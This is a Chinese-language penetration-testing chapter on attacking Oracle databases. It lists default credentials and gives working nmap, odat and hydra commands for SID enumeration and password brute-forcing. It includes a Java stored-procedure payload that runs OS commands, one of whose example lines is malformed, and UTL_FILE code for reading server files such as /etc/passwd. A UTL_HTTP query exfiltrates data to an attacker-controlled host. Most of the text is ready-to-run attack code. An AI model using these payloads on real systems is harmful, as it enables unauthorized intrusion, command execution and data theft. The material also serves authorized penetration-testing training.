# 04-Oracle渗透

> Oracle 结构复杂、默认账户多，但利用链成熟度依赖 odat 工具。前置见 [[01-数据库渗透流程与探测|01章]]。

## 目录
- [[#一、默认账户表|一、默认账户表]]
- [[#二、TNS服务探测|二、TNS服务探测]]
- [[#三、SID枚举与爆破|三、SID枚举与爆破]]
- [[#四、账户爆破|四、账户爆破]]
- [[#五、Java存储过程提权RCE|五、Java存储过程提权RCE]]
- [[#六、UTL_FILE读文件|六、UTL_FILE读文件]]
- [[#七、UTL_HTTP带外提取|七、UTL_HTTP带外提取]]
- [[#八、常见CVE|八、常见CVE]]

---

## 一、默认账户表

Oracle 历史版本遗留大量默认账户，口令固定且公开：

| 账户 | 默认口令 | 说明 |
|------|---------|------|
| system | manager | 高权限管理账户 |
| sys | change_on_install / manager | SYSDBA 最高权限 |
| scott | tiger | 经典演示账户（老版本默认解锁） |
| dbsnmp | dbsnmp | 智能代理账户 |
| oracle | oracle | 部分模板安装 |
| ctxsys | ctxsys | 文本索引组件 |
| mdsys | mdsys | 空间数据组件 |
| outln | outln | 优化器组件 |

> 账户是否锁定由 `dba_users.account_status` 决定；11g 起多数默认组件账户处于 LOCKED 状态，但运维手工解锁的并不少见。

---

## 二、TNS服务探测

### 2.1 nmap 脚本

```bash
# TNS 版本指纹
nmap -p 1521 --script oracle-tns-version <target>

# TNS 枚举辅助
nmap -p 1521 --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=users.txt <target>
```

### 2.2 odat 工具简介

odat（Oracle Database Attacking Tool）是 Oracle 渗透的全能框架，覆盖 SID 枚举、口令爆破、文件读写、RCE：

```bash
git clone https://github.com/quentinhardy/odat.git
cd odat && pip install -r requirements.txt
python3 odat.py --version

# 全模块自动测试（一条命令跑完探测+爆破）
python3 odat.py all -s <target> -p 1521
```

---

## 三、SID枚举与爆破

连接 Oracle 必须知道 SID（数据库实例标识）。常见 SID：`orcl`、`xe`、`orcl1`、`test`。

```bash
# nmap 字典爆破 SID
nmap -p 1521 --script oracle-sid-brute <target>

# odat 枚举（内置字典 + 指定字典）
python3 odat.py sidguesser -s <target> -p 1521
python3 odat.py sidguesser -s <target> -p 1521 -d sid.txt

# 已知 SID 时验证连通
sqlplus system/manager@//<target>:1521/orcl
```

---

## 四、账户爆破

```bash
# odat passwordguesser：按 用户名=口令 与字典组合爆破
python3 odat.py passwordguesser -s <target> -p 1521 -d orcl
python3 odat.py passwordguesser -s <target> -p 1521 -d orcl --accounts-file accounts.txt

# hydra 也支持 oracle-listener 与 oracle 模块
hydra -L users.txt -P pass.txt <target> oracle-listener
hydra -l scott -P pass.txt <target:1521/ORCL> oracle
```

爆破命中后确认权限：

```sql
SELECT * FROM session_privs;                    -- 当前会话全部权限
SELECT username FROM dba_users WHERE account_status='OPEN';
SELECT * FROM dba_role_privs WHERE grantee='SCOTT';   -- 是否有 DBA 角色
```

---

## 五、Java存储过程提权RCE

**原理：** Oracle 内嵌 JVM，拥有 `JAVA ADMIN` 或 DBA 权限的账户可创建调用 Java 的存储过程，从而以 **oracle 服务进程身份**执行系统命令。

**完整思路（需 DBA 权限）：**

```sql
-- Step 1: 创建 Java 源码对象
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "cmd" AS
import java.io.*;
public class cmd {
    public static String run(String c) throws IOException {
        StringBuffer b = new StringBuffer();
        Process p = Runtime.getRuntime().exec(c);
        InputStream i = p.getInputStream();
        int ch;
        while ((ch = i.read()) != -1) b.append((char) ch);
        return b.toString();
    }
}
/

-- Step 2: 包装为 PL/SQL 函数
CREATE OR REPLACE FUNCTION runcmd(p_cmd IN VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'cmd.run(java.lang.String) return java.lang.String';
/

-- Step 3: 执行命令（回显式）
SELECT runcmd('id') FROM dual;
SELECT runcmd('/bin/bash -c $@|bash 0<&2 1>&2; whoami > /tmp/out') FROM dual;
```

简化变体：若 `dbms_java.runjava` 可用（部分版本），可直接：

```sql
SELECT dbms_java.runjava('com.sun.tools.javac.Main /tmp/x.java') FROM dual;
```

无 DBA 权限时先尝试通过 `CREATE ANY PROCEDURE` 等中间权限提权到 DBA。odat 的 `utlhttp`/`java` 模块封装了以上过程：

```bash
python3 odat.py java -s <target> -p 1521 -d orcl -U scott -P tiger --exec "/bin/id"
```

---

## 六、UTL_FILE读文件

`UTL_FILE` 包允许在 **DIRECTORY 对象授权范围内**读写服务器文件。需要对应目录的 READ 权限：

```sql
-- 列出可用 DIRECTORY
SELECT * FROM all_directories;

-- 读文件
DECLARE
    f UTL_FILE.FILE_TYPE;
    buf VARCHAR2(4000);
BEGIN
    f := UTL_FILE.FOPEN('DATA_PUMP_DIR', 'listener.log', 'R');
    LOOP
        UTL_FILE.GET_LINE(f, buf);
        DBMS_OUTPUT.PUT_LINE(buf);
    END LOOP;
EXCEPTION WHEN no_data_found THEN UTL_FILE.FCLOSE(f);
END;
/
```

odat 一键化：

```bash
python3 odat.py utlfile -s <target> -p 1521 -d orcl -U scott -P tiger --getFile /etc/passwd /tmp/passwd
```

---

## 七、UTL_HTTP带外提取

当注入点无回显时（盲注场景），用 `UTL_HTTP.REQUEST` 把数据发到攻击者控制的 HTTP 服务器实现带外（OOB）提取：

```sql
-- 攻击机先起监听: python3 -m http.server 8080
SELECT UTL_HTTP.REQUEST('http://<攻击IP>:8080/'||(SELECT user FROM dual)) FROM dual;
```

同族包还有 `UTL_INADDR.GET_HOST_ADDRESS`（DNS 外带）与 `HTTPURITYPE`。odat 封装：

```bash
python3 odat.py utlhttp -s <target> -p 1521 -d orcl -U scott -P tiger --url "http://<攻击IP>:8080"
```

---

## 八、常见CVE

| CVE | 影响范围 | 问题 |
|-----|---------|------|
| CVE-2012-1675 | TNS Listener 全系（未打补丁） | TNS 投毒劫持，配合 MITM |
| CVE-2020-14882/14883 | WebLogic Console | 非 Oracle 库本体但常与库同机部署，组合 RCE |
| CVE-2018-3004 等 | 各季度 CPU 补丁前版本 | TNS 协议层漏洞 |

实战建议：拿到精确版本后对照官方 Critical Patch Update 列表；公网暴露的 1521 十有八九多年未打补丁。

---
**返回** [[数据库安全总目录|数据库安全 总目录]]
